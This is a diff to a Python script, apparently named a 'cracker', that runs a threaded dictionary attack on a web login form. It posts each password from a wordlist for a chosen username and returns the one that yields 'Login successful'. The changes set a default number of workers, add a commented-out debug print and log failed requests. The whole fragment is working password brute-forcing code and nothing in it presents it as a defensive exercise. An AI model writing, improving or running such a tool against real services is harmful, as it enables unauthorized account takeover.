@@ -22,16 +22,18 @@ except requests.exceptions.RequestException as e:
 
 username = input("username? ")
 wordlist_path = input("wordlist path, preferably same folder as cracker. [.txt]: ")
-max_workers = input("Max workers? higher number, higher performance, more resources.[10 by default]: ")
+max_workers = input("Max workers? higher number, higher performance, more resources. [10 by default]: ") or 10
 
 def try_password(password):
     data = {"username": username, "password": password}
     try:
         response = requests.post(url, data=data, timeout=0.2)
+        # Debug: print status code and a snippet of the response
+        # print(f"Trying {username} / {password} | Status: {response.status_code} | Response: {response.text[:100]}")
         if "Login successful" in response.text:
             return password
-    except requests.exceptions.RequestException:
-        pass
+    except requests.exceptions.RequestException as e:
+        print(f"Request failed for {username} / {password}: {e}")
     return None
 
 def dictionary_attack(username, wordlist):
